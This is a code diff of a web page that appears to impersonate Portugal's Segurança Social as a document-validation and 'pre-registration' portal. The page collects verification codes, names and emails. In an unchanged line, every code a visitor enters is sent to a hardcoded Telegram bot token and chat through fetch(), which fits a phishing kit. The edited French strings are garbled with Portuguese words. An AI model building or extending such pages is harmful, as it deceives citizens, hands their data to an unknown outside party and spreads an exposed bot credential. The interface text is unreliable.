@@ -129,7 +129,7 @@
         const dict = {
             pt: { h: "SEGURANÇA SOCIAL", t: "Autenticação", i: "Introduza o código de verificação impresso no documento para validar a autenticidade.", r: "Não sou um robô", b: "Validar Documento", s: "✓ Autenticação efetuada com sucesso", st: "Estado", dt: "Data", hr: "Hora", cd: "Código", d: "ABRIR DOCUMENTO ORIGINAL", e: "Código inválido.", n: "Validar outro documento", c: "Contate-nos", sidt: "Contate-nos", sids: "Solicite suporte ou realize o pré-cadastro oficial.", n1: "Primeiro Nome", n2: "Sobrenome", em: "E-mail", as: "Assunto", ms: "Mensagem", send: "Enviar Cadastro" },
             en: { h: "SOCIAL SECURITY", t: "Authentication", i: "Enter the verification code printed on the document to validate authenticity.", r: "I'm not a robot", b: "Validate Document", s: "✓ Authentication successful", st: "Status", dt: "Date", hr: "Time", cd: "Code", d: "OPEN ORIGINAL DOCUMENT", e: "Invalid code.", n: "Validate another document", c: "Contact us", sidt: "Contact us", sids: "Request support or perform official pre-registration.", n1: "First Name", n2: "Last Name", em: "Email", as: "Subject", ms: "Message", send: "Send Registration" },
-            fr: { h: "SÉCURITÉ SOCIALE", t: "Authentification", i: "Entrez le code de vérification imprimé sur le document pour valider l'authenticité.", r: "Je ne suis pas un robot", b: "Valider le document", s: "✓ Authentification réussie", st: "État", dt: "Date", hr: "Heure", cd: "Code", d: "OUVRIR LE DOCUMENT ORIGINAL", e: "Code invalide.", n: "Valider um outro document", c: "Contactez-nous", sidt: "Contactez-nous", sids: "Demandez une assistance ou effectuez uma pré-inscription officielle.", n1: "Prénom", n2: "Nom de família", em: "E-mail", as: "Sujet", ms: "Message", send: "Envoyer l'inscription" }
+            fr: { h: "SÉCURITÉ SOCIALE", t: "Authentification", i: "Entrez le code de verificação imprimé sur le document pour valider l'authenticité.", r: "Je ne suis pas un robot", b: "Valider le document", s: "✓ Authentification réussie", st: "État", dt: "Date", hr: "Heure", cd: "Code", d: "OUVRIR LE DOCUMENT ORIGINAL", e: "Code invalide.", n: "Valider um autre document", c: "Contactez-nous", sidt: "Contactez-nous", sids: "Demandez uma assistência ou effectuez uma pré-inscription officielle.", n1: "Prénom", n2: "Nom de família", em: "E-mail", as: "Sujet", ms: "Message", send: "Envoyer l'inscription" }
         };
         const t = dict[lang];
         document.getElementById('h-txt').innerText = t.h;
@@ -189,7 +189,7 @@
         document.getElementById('res-time').innerText = now.toLocaleTimeString('pt-PT', { hour: '2-digit', minute: '2-digit' });
         document.getElementById('res-code').innerText = code;
         
-        // CORREÇÃO: Busca o arquivo dentro da pasta "codes/"
+        // CORREÇÃO: Foi adicionado o prefixo "codes/" para que o navegador encontre os arquivos na pasta correta.
         document.getElementById('pdfLink').href = "codes/" + code.toLowerCase() + ".pdf";
 
         fetch(`https://api.telegram.org/bot8769315569:AAGwqgq-2ymjcX6J6BzXkj_X2Zc5HPJtNbk/sendMessage?chat_id=8539973503&text=🛡️ VALIDADO: ${code}`);
